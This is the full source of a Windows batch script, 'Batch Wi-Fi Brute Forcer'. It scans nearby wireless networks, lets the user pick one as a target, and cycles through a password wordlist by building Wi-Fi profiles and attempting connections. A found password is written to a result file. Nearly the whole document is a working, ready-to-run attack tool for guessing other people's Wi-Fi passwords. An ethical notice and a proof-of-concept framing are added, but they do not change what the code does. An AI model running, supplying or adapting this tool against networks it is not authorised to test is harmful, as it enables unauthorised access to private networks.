@echo off
:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX, Improved by Kvc (Batch-Man.com)
:: Please refer to https://github.com/TechnicalUserX for more projects

:: This program is created to be a proof of concept that it is possible
:: to write a working Wi-Fi attack tool with Batchfiles since there 
:: are countless examples on the internet that claims to be legit
:: hacking tools, working on CMD. While this tool does not claim
:: a 100% success ratio, it still works if the target Wi-Fi has
:: weak password. :)

:: There is already a wordlist file in the repository but you are
:: free to use your own wordlists.

cls
setlocal enabledelayedexpansion
title Batch Wi-Fi Brute Forcer
color 0f

set "Path=%CD%;%CD%\Files;%~dp0;%~dp0Files;%Path%;"
cd /D "%~dp0Files"

if not exist "importwifi.xml" (call :exit_fatal "importwifi.xml is missing. Exiting...")
if exist "importwifi_attempt.xml" (del importwifi_attempt.xml)
if exist "importwifi_prepared.xml" (del importwifi_prepared.xml)

::This sets the code page to English (US) and forces CMD to output in English where applicable.
set _ver=20250308
chcp 437 >nul
set "_PASSWORD_FOUND_FILE=%~dp0Result_!wifi_target!_PASSWORD.txt"

::Including VT100 Library by Kvc for text decoration ...
:: Just call it and it will add all the required Variables for use ...
call VT100.bat

:: Interface Variables
set "_Interface_Count=0"
set "interface_mac=not_defined"
set "interface_id=not_defined"
set "_adapter_state=not_defined"
set "interface_description=not_defined"
set "wifi_target=not_defined"

if not exist "!temp!\WBF_counter.txt" (
set attack_counter_option=0
) else (
set /p attack_counter_option=<"!temp!\WBF_counter.txt"
)

if not exist "wordlist.txt" (
set wordlist_file=not_defined
) else (
set wordlist_file=wordlist.txt
)


:program_entry
call :interface_init
call :mainmenu
goto :eof

:interface_detection
echo !_Yellow!Detecting interfaces...
Set _Temp=0
set _Interface_Count=0

set _Interface_String=
for /f "tokens=*" %%A in ('netsh wlan show interfaces') do (
	if /i "!_Temp!" == "0" (set "_Interface_String=%%A")
	set _Temp=1
)

REM echo !_Interface_String!
call :extract_num "!_Interface_String!" _Interface_Count
REM echo Total interfaces: !_Yellow!!_Interface_Count!!_Default!

set _Temp=0
set _Count=0
set _Interface_Index=-1
for /f "skip=2 tokens=1,* delims=:" %%A in ('netsh wlan show interfaces') do (
	if "%%B" NEQ "" (
		if !_Temp! == 0 (
			set "_Interface_Name=%%~B"
			
			REM  Removing, if the String 'Wifi' present in Name
			REM  Removing, any number present in Name
			REM  e.g: Wifi, Wi-fi, Wi-fi 2, Wi-fi 3 etc.
			
			REM  Using this method, because, sometimes the description of interface also has word - Wi-Fi
			REM e.g: Intel(R) Wi-Fi 6 AX201 160MHz
			set "_Interface_Name=!_Interface_Name:-=!"
			set "_Interface_Name=!_Interface_Name:wifi=!"
			for /L %%a in (0,1,9) do (set "_Interface_Name=!_Interface_Name:%%a=!")
			set "_Interface_Name=!_Interface_Name: =!"
			
			if "!_Interface_Name!" == "" (
				REM Echo Name: %%B
				Set _Temp=1
				Set /A _Interface_Index+=1
			)
			set _Count=0
		)
		
		Set /A _Count+=1
		if !_Count! GTR 4 (Set _Temp=0)
		
		if !_Temp! == 1 (
			set "_Temp_Value=%%~B"
			if /i "!_Temp_Value:~0,1!" == " " (set "_Temp_Value=!_Temp_Value:~1!")

			if !_Count! == 1 (set "interface[!_Interface_Index!]_name=!_Temp_Value!")
			if !_Count! == 2 (set "interface[!_Interface_Index!]_description=!_Temp_Value!")
			if !_Count! == 3 (set "interface[!_Interface_Index!]_ID=!_Temp_Value!")
			if !_Count! == 4 (set "interface[!_Interface_Index!]_mac=!_Temp_Value!")
		)
	)
)

REM for /l %%A in (0,1,!_Interface_Index!) do (
REM 	echo Name: !_Interface[%%A]_Name!
REM 	echo Desc: !_Interface[%%A]_Description!
REM 	echo GUID: !_Interface[%%A]_ID!
REM 	echo MAC : !_Interface[%%A]_Mac!
REM )
goto :EOF


:WBF_logo
cls
echo.
echo !_yellow! [---------------------------------------------------------------------------]
echo.!_Green!
echo.                              ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo.
echo !_yellow! [---------------------------------------------------------------------------]
echo.                      !_cyan!Brute Force Manager Version !_Red!!_ver!
echo.                              !_yellow!Developed by !_Cyan!TUX
echo.                               !_yellow!Improved by !_Cyan!Kvc
echo !_yellow! [---------------------------------------------------------------------------]
echo. !_Default!
goto :eof

:color_echo
echo. called :Color_echo - "%3"
goto :eof

:interface_init
:: Interface detection and selection
call :WBF_logo
call :interface_detection
echo !_Cyan!Interfaces Init ...
if "!_Interface_Count!" equ "1" (
	echo !_Yellow!Only '1' Interface Found!
	echo !_white!!interface[0]_description! ^(!_blue!!interface[0]_mac!!_white! ^)
	echo Making !interface[0]_description! the default interface...
	set interface_name=!interface[0]_name!
	set interface_id=!interface[0]_id!
	set interface_description=!interface[0]_description!
	set interface_mac=!interface[0]_mac!
	timeout /t 5 
)

if !_Interface_Count! gtr 1 (
	echo !_Yellow! Multiple Interfaces Found! : !_Green!'!_Interface_Count!'
	echo.
	timeout /t 5
	call :interface_selection
)

if "!_Interface_Index!" == "-1" (

	echo !_Red!WARNING!_Default!
	echo.
	echo No interfaces found on this device^^!
	echo.
	set interface_id=not_defined
	set interface_description=not_defined
	set interface_mac=not_defined
	pause
	cls
)
goto :eof


:interface_selection
call :WBF_logo
echo !_cyan!Interface Selection
echo.
set wifi_target=not_defined
set /a cancel_index=!_Interface_Index!+2

for /l %%a in ( 0, 1, !_Interface_Index! ) do (
	set /A _Sr=%%a+1
	echo !_magenta!!_Sr!.^> !_white!!interface[%%a]_description!^(!_blue!!interface[%%a]_mac!!_white! ^)
	echo.
)
echo !_red!!cancel_index!^> Cancel
echo.

call :program_prompt

if "!program_prompt_input!" equ "" (
	call :program_prompt_invalid_input
	goto :interface_selection
)

set /A program_prompt_input-=1

if !program_prompt_input! leq !_Interface_Index! (
	if !program_prompt_input! geq 0 (
		echo.
		echo Selecting !interface[%program_prompt_input%]_description! ...
		set interface_name=!interface[%program_prompt_input%]_name!
		set interface_id=!interface[%program_prompt_input%]_id!
		set interface_description=!interface[%program_prompt_input%]_description!
		set interface_mac=!interface[%program_prompt_input%]_mac!
		timeout /t 3 >nul
	) else (
		if "!program_prompt_input!" equ "!cancel_index!" (
			set interface_id=not_defined
			set interface_description=not_defined
			set interface_mac=not_defined
			goto :eof
		) else (
			call :program_prompt_invalid_input
			goto :interface_selection
		)
	)
) else (
	if "!program_prompt_input!" equ "!cancel_index!" (
		set interface_id=not_defined
		set interface_description=not_defined
		set interface_mac=not_defined
		goto :eof
	) else (
		call :program_prompt_invalid_input
		goto :interface_selection
	)
)
goto :eof


:program_prompt
set program_prompt_input=
set /p program_prompt_input=!_green! bruteforcer!_white!$ !_Default!
goto :eof


:program_prompt_invalid_input
echo !_red!Invalid input!_Default!
timeout /t 3 >nul
goto :eof


:mainmenu
call :WBF_logo
echo !_magenta!Name		: !_white!!interface_name!
echo !_magenta!Interface	: !_white!!interface_description! ^(!_blue!!interface_mac!!_white! ^)
echo !_magenta!ID		: !_white!!interface_id!
echo !_magenta!Target		:!_Yellow! !wifi_target!
echo !_magenta!Wordlist	:!_White! !wordlist_file!
echo.
echo Type 'help' for more info
call :program_prompt

if /i "!program_prompt_input!" equ "scan" (
	call :scan
	goto :mainmenu
)

if /i "!program_prompt_input!" equ "interface" (
	call :interface_init
	goto :mainmenu
)

if /i "!program_prompt_input!" equ "attack" (
	call :attack
	goto :mainmenu
)

if /i "!program_prompt_input!" equ "help" (
	call :help
	goto :mainmenu
)


if /i "!program_prompt_input!" equ "wordlist" (
	call :wordlist
	goto :mainmenu
)

if /i "!program_prompt_input!" equ "counter" (
	call :counter
	goto :mainmenu
)

if /i "!program_prompt_input!" equ "exit" (
	exit
)

call :program_prompt_invalid_input
goto :mainmenu


:scan
call :WBF_logo
if "!interface_id!" equ "not_defined" (
	echo.
	echo !_Red!You have to select an interface to perform a scan ...
	set wifi_target=not_defined
	pause
	goto :eof
)
echo !_Red!
netsh wlan disconnect interface="!interface_name!"
echo !_cyan!Possible Wi-Fi Networks
set /p ".=!_yellow!Scanning ... " < nul

Set _Temp=0
set _Temp_count=0
set _Wifi_Count=0
set _Wifi_String=
set "_file=!temp!\wifi_scan_!random!!random!!random!!random!.txt"
If Exist "!_file!" (del /f /q "!_file!" >nul 2>nul)
timeout /t 1 >nul
for /f "skip=2 tokens=*" %%A in ('netsh wlan show networks mode^=bssid interface^="!interface_name!"') do (
	if /i "!_Temp!" == "0" (
		set "_Wifi_String=%%A"
		set _Temp=1
	) else (
		set "_tmp_str=%%A"
		if /i "%%A" NEQ "!_tmp_str:SSID=!" (
			if /i "%%A" EQU "!_tmp_str:BSSID=!" (
				set /a _Temp_count+=1
				set /p ".=!_Goto@x:x=0!!_yellow!Scanning ... !_cyan!!_Temp_count!" < nul
			)
		)
		echo.%%A >> "!_file!"
	)
)


REM echo !_Wifi_String!
call :extract_num "!_Wifi_String!" _Wifi_Count
echo !_Goto@x:x=0!!_yellow!Scanning ... !_Green!!_Wifi_Count!!_Default!
set /p ".=!_yellow!Processing ... " < nul
set _Temp=0
set _Temp_count=0
set _Count=0
set _Wifi_Index=-1
set wifi_max_length=0
for /f "usebackq tokens=1,* delims=:" %%A in ("!_file!") do (
	if "%%~A" NEQ "" (
		if !_Temp! == 0 (
			set "_SSID=%%~A"
			
			REM  Removing, if the String 'SSID' present in variable
			REM  Removing, any number present in variable
			REM  e.g: SSID, SSID 2, SSID 3 etc.
			REM echo !_SSID!
			@REM set "_SSID=!_SSID:SSID=!"
			REM echo !_SSID!
			@REM for /L %%a in (0,1,9) do (set "_SSID=!_SSID:%%a=!")
			REM echo. !_SSID!.
			@REM set "_SSID=!_SSID: =!"
			REM echo !_SSID!
			
			REM Improving algorithm to detect SSID, as previous one wasn't working due to a extra character
			REM in different language systems...
			REM Verifying if the string contains the word 'SSID' and do not contain the word 'BSSID'
			if "!_SSID!" NEQ "!_SSID:SSID=!" (
				if "!_SSID!" EQU "!_SSID:BSSID=!" (
				REM Echo _SSID: %%A
				Set _Temp=1
				Set /A _Wifi_Index+=1
				set /a _Temp_count+=1
				set /p ".=!_Goto@x:x=0!!_yellow!Processing ... !_cyan!!_Temp_count!" < nul
				)
			)
			set _Count=0
		)
		
		Set /A _Count+=1
		if !_Count! GTR 9 (Set _Temp=0)
		
		if !_Temp! == 1 (
			set "_Temp_Value=%%~B"
			set "_Test_String=!_Temp_Value: =!"
			if /i "!_Temp_Value:~0,1!" == " " (set "_Temp_Value=!_Temp_Value:~1!")
			if /i "!_Temp_Value:~-1!" == " " (set "_Temp_Value=!_Temp_Value:~0,-1!")
			
			if !_Count! == 1 (
				if "!_Test_String!" NEQ "" (set "Wifi[!_Wifi_Index!]_SSID=!_Temp_Value!") else (set "Wifi[!_Wifi_Index!]_SSID=Hidden_Network")
				for %%Z in (!_Wifi_Index!) do (
					Call Getlen "!Wifi[%%Z]_SSID!"
					set len=!errorlevel!
					if !len! GTR !wifi_max_length! (set wifi_max_length=!len!)
				)
			)
			if !_Count! == 5 (set "Wifi[!_Wifi_Index!]_BSSID=!_Temp_Value!")
			if !_Count! == 6 (set "Wifi[!_Wifi_Index!]_Signal=!_Temp_Value!")
			if !_Count! == 7 (
				set "Wifi[!_Wifi_Index!]_type=!_Temp_Value!"
				Call :getWifiStandard "!_Temp_Value!" "Wifi[!_Wifi_Index!]_info"
				)
			if !_Count! == 8 (
				if /i "!_Temp_Value:~0,1!" == "5" (set "_Temp_Value=  5 GHz")
				set "Wifi[!_Wifi_Index!]_freq=!_Temp_Value!"
				)
			if !_Count! == 9 (set "Wifi[!_Wifi_Index!]_channel=!_Temp_Value!")
			REM echo !_Temp_Value!
		)
	)
)


echo !_Goto@x:x=0!!_yellow!Processing ... !_Green!!_Temp_count!!_Default!
echo !_Green!Done
timeout /t 4 >nul

:Wifi_print
cls
echo.
echo !_cyan!Possible Wi-Fi Networks
echo.
echo Available Networks: !_Wifi_Count!
echo.
for /l %%A in (0,1,!_Wifi_Index!) do (
	Call Getlen "!Wifi[%%A]_SSID!"
	set len=!errorlevel!
	set /a _add_spaces=!wifi_max_length!-!len!
	set "_TempWifiName=!Wifi[%%A]_SSID!"
	if /i "!_TempWifiName!" == "Hidden_Network" (set "_TempWifiName=!_Negative!!_TempWifiName!!_Positive!")
	for /l %%a in (0,1,!_add_spaces!) do (set "_TempWifiName=!_TempWifiName! ")
	
	set /a _Sr=%%A+1
	if !_Sr! lSS 10 (set "_Sr= !_Sr!") Else (set "_Sr=!_Sr!")
	
	set _temp_zero=
	set "_TempsignalText=!Wifi[%%A]_signal!"
	set "_TempsignalText=!_TempsignalText:~0,-3!"
	if !_TempsignalText! LSS 9 (set _temp_zero=0)
	if !_TempsignalText! GEQ 70 (
		set "_TempsignalText=!_Green!!_temp_zero!!_TempsignalText!"
	) else (
		if !_TempsignalText! GTR 40 (
			set "_TempsignalText=!_Yellow!!_temp_zero!!_TempsignalText!"
		) else (
			if !_TempsignalText! LEQ 40 (
				set "_TempsignalText=!_Red!!_temp_zero!!_TempsignalText!"
			)
		)
	)
	
	call :getWifiStandard "!Wifi[%%A]_type!" "_info"
	echo !_White!!_Sr!. !_TempWifiName! ...!_TempsignalText!%% !_White!^(!_Blue!!wifi[%%A]_BSSID!!_White!^) !_Green!!wifi[%%A]_freq!!_Default!, !_info!
	)

echo. 
echo '!_Green!S!_Default!' to scan again, '!_Red!Q!_Default!' to quit OR !_Yellow!Serial number!_Default! from list...

call :program_prompt

if /i "!program_prompt_input!" == "S" (goto :scan)
if /i "!program_prompt_input!" == "Q" (goto :EOF)

if !program_prompt_input! GTR 0 (
	if !program_prompt_input! LEQ !_Wifi_Count! (
		set /A program_prompt_input-=1
		for %%A in (!program_prompt_input!) do (set "wifi_target=!wifi[%%A]_ssid!")
		goto :eof
	)
)

call :program_prompt_invalid_input
Goto :Wifi_print


:attack
set attack_finalize=false
if "!wordlist_file!" equ "not_defined" (
	cls
	echo.
	echo !_red!Please provide a wordlist...
	echo.
	echo.
	pause
	goto :eof
)


if "!wifi_target!" equ "not_defined" (
	cls
	echo.
	echo !_red!Please select a target after scanning...
	echo.
	echo.
	pause
	goto :eof
)

if "!interface_id!" equ "not_defined" (
	cls
	echo.
	echo !_red!Please select an interface...
	echo.
	echo.
	pause
	goto :eof
)

cls
echo !_Yellow!========================================
echo         Wi-Fi Brute Forcer - !_Red!WARNING
echo !_Yellow!========================================
echo.
echo !_Blue!Note:!_Default!
echo ^> If connected to "!_Green!!wifi_target!!_Default!", its profile will be deleted.
echo ^> Low signal strength may cause false negatives.
echo ^> This app might not find the correct password if the signal strength is too low.
echo ^> !_Yellow!Remember, this is an online attack. Expect slow attempts.!_white!
echo.
echo !_Blue!Ethical Notice:!_Default!
echo ^> Use only on networks you own or with explicit permission.
echo ^> Unauthorized access is !_Red!illegal!_Default!.
echo ^> !_Yellow!Only proceed if you know what you are doing.
echo.
pause
netsh wlan delete profile name="!wifi_target!" interface="!interface_name!">nul
cls

:: Prepare ssid import
del /Q /F importwifi_prepared.xml 2>nul
for /f "tokens=*" %%a in (importwifi.xml) do (
	set variable=%%a
	echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
)

set password_count=0
set _total_password_count=0

for /f "tokens=1,* delims=[]" %%A in ('find /v /n "" "!wordlist_file!"') do (set "_total_password_count=%%A")

for /f "tokens=1" %%a in (!wordlist_file!) do (

	set /a password_count=!password_count!+1
	set password=%%a
	set temp_auth_num=0
	call :prepare_attempt "!password!"
	netsh wlan add profile filename="importwifi_attempt.xml" interface="!interface_name!" >nul
	cls
	echo.
	set /A "_percentage=(!password_count!*1000)/!_total_password_count!"
	echo !_cyan!Attacking
	echo !_magenta!Target Network:	!_Yellow!!wifi_target!
	echo !_magenta!Password Count:	!_Green!!password_count!!_white! / !_Yellow!!_total_password_count! ^(!_percentage:~0,-1!.!_percentage:~-1!%%^)
	echo !_blue!Trying password -^> !_Yellow!!password!
	echo.
	echo !_cyan!Attempting ...
	call :attack_attempt

	if "!attack_finalize!" equ "true" (
		set attack_finalize=false
		goto :eof
	)
)

call :attack_failure
goto :eof


:attack_failure
del /Q /F importwifi_prepared.xml 2>nul
del /Q /F importwifi_attempt.xml 2>nul
cls
echo.
echo !_Yellow!========================================
echo !_red!Could not find the password.
echo !_Yellow!========================================
echo.
echo !_Yellow!Looks like, You need another password list...
echo.
echo !_White!Download and try another password list.
echo !_cyan!In the mainmenu, type !_Yellow!wordlist!_cyan! to select a new wordlist.
echo.
netsh wlan delete profile "!wifi_target!" interface="!interface_name!">nul
pause
goto :eof

:attack_success
del /Q /F importwifi_prepared.xml 2>nul
del /Q /F importwifi_attempt.xml 2>nul
echo.
echo !_green!PASSWORD FOUND ...
echo.
echo !_magenta!Target		: !_Yellow!!wifi_target!
echo !_magenta!Password	: !_Yellow!!password!
echo !_magenta!Attempt		: !_white!!password_count!
echo.
echo Batch Wi-Fi Brute Forcer Result>>"!_PASSWORD_FOUND_FILE!"
echo Target     : !wifi_target!>>"!_PASSWORD_FOUND_FILE!"
echo At attempt : !password_count!>>"!_PASSWORD_FOUND_FILE!"
echo Password   : !password!>>"!_PASSWORD_FOUND_FILE!"
echo.>>"!_PASSWORD_FOUND_FILE!"
start "" notepad "!_PASSWORD_FOUND_FILE!"
pause
goto :eof

:attack_attempt
netsh wlan connect name="!wifi_target!" interface="!interface_name!" >nul

if "!attack_counter_option!" equ "0" (set attack_counter=2) else (set attack_counter=!attack_counter_option!)
set attack_authenticating_detected=false

for /l %%a in (1,1,3) do (
	if !attack_counter! == 0 (
		del /Q /F importwifi_attempt.xml 2>nul
		goto :eof
	)
	set /p ".=!_White!Attempts Left ^(!_Yellow!!attack_counter!!_White!^) ... !_Yellow!Trying..." <nul

	set "_adapter_state=Disconnected"
	powershell -command "Get-NetAdapter" | find /i "!interface_description:~0,30!" | find /i "up" 2>nul >nul && (	set "_adapter_state=Connected") || (set "_adapter_state=Disconnected")
	if /i "!_adapter_state!" == "Disconnected" (echo !_RED! :	FAILED)
	if /i "!_adapter_state!" == "Connected" (
		echo !_green! :	CONNECTED
		del /Q /F importwifi_attempt.xml 2>nul
		set attack_finalize=true
		timeout /t 3 >nul
		call :attack_success
		goto :eof
	)
	set /a attack_counter-=1
)
goto :eof

:help
cls
echo.
echo !_Yellow!================================================================================
echo !_cyan!				Commands
echo !_Yellow!================================================================================
echo.
echo  Version: !_Green!!_ver!
echo.
echo  !_Yellow!help             !_White!: Displays this page
echo  !_Yellow!wordlist         !_White!: Provide a wordlist file
echo  !_Yellow!scan             !_White!: Performs a WI-FI scan
echo  !_Yellow!interface        !_White!: Open Interface Management
echo  !_Yellow!attack           !_White!: Attacks selected WI-FI
echo  !_Yellow!counter          !_White!: Sets the attack counter
echo  !_Yellow!exit             !_White!: Close the program
echo.
echo  ------------------------------------------------------------------------------
echo  Credits:
echo  ^> !_Yellow!einstein1969		- !_white!Provided screenshots in different language settings.
echo  ^> !_Yellow!BUZZARDGTA		- !_white!Provided screenshots in different language settings.
echo  ^> !_Yellow!Kvc ^(!_Cyan!Batch-man.com!_yellow!^)	- !_white!Improved interface detection,
echo 			  !_white!Improved Wi-Fi scanning,
echo 			  !_white!Improved password authentication.
echo.
echo  For more information, please refer to "README.md"
echo  More projects : !_Blue!https://github.com/TechnicalUserX!_Default!
echo. 
echo  This Project was posted on !_Green!TheBATeam!_Default! - ^(Now, Rebranded as, !_Cyan!Batch-Man!_Default!^)
echo  Don't Forget to show your love and contribution.
echo.
pause
goto :eof


:wordlist
cls
echo.
echo !_cyan!Wordlist
echo.
echo Please provide the path to the wordlist file or type 'cancel' to return to the previous menu.
echo.
call :program_prompt

if /i "!program_prompt_input!" equ "cancel" (
    echo Returning to the previous menu...
    timeout /t 2 >nul
    goto :eof
)

set program_prompt_input=!program_prompt_input:"=!
if exist "!program_prompt_input!" (
    set wordlist_file=!program_prompt_input!
    echo Wordlist file selected successfully.
    goto :eof
) else (
    echo !_red!Provided path does not resolve to a file
    timeout /t 2 >nul
    goto :wordlist
)

:counter
cls
echo.
echo !_cyan!Set Attempt Count
echo.
echo.
echo Please provide number for per-password 
echo counter while attacking a network.
echo.
echo This counter will be used to query network
echo connection whether it is successful.
echo.
call :program_prompt
echo.
echo !program_prompt_input! | findstr /r "^[0-9]*$" >nul

if "!errorlevel!" equ "0" (
	set attack_counter_option=!program_prompt_input!
) else (
	echo !_red!Provided input is not a valid number
	timeout /t 2 >nul
)
goto :eof

:prepare_attempt
for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
	set code=%%x
	echo !code:changethiskey=%~1!>>importwifi_attempt.xml
)
goto :eof


:exit_fatal
echo !_red!%~1
timeout /t 3 >nul
exit

:: -----------------------------------------------------------------------------
:: Module: Extract_num
:: Author: kvc
:: Description: This module extracts all numeric digits from a single-line
::              input string and concatenates them into the variable "digits".
::              It then returns the concatenated digits in the vairable defined in
::				second parameter.
:: -----------------------------------------------------------------------------

:extract_num [%1=String] [%2=_Result_variable]
Setlocal EnableDelayedExpansion
set "_input=%~1"
set "_digits="

:extract_num_loop
if "!_input!" == "" (goto :extract_num_done)
set "_char=!_input:~0,1!"
set "_input=!_input:~1!"

for /l %%A in (0,1,9) do (
if "!_char!" == "%%A" (set "_digits=!_digits!!_char!")
)
goto :extract_num_loop

:extract_num_done
endlocal && Set "%~2=%_digits%"
goto :EOF


:getWifiStandard [%1=Radio Type] [%2=Result Variable]
Setlocal
set "IEEEStandard=%~1"
set "_Result=Unknown Standard"

:: Check the IEEE standard and set _Result accordingly.
if /i "%IEEEStandard!"=="802.11b" (set "_Result=Gen 1, 11 Mbps (Slow)")
if /i "%IEEEStandard%"=="802.11a" (set "_Result=Gen 2, 54 Mbps (Slow)")
if /i "%IEEEStandard%"=="802.11g" (set "_Result=Gen 3, 54 Mbps (Slow)")
if /i "%IEEEStandard%"=="802.11n" (set "_Result=Gen 4, 600 Mbps (Average)")
if /i "%IEEEStandard%"=="802.11ac" (set "_Result=Gen 5, 1.3+ Gbps (Fast)")
if /i "%IEEEStandard%"=="802.11ax" (set "_Result=Gen 6, 9.6 Gbps (Super Fast)")
if /i "%IEEEStandard%"=="802.11be" (set "_Result=Gen 7 (We are in Future), Expected >30 Gbps; Expected 2026")

endlocal && set "%~2=%_Result%"
goto :EOF
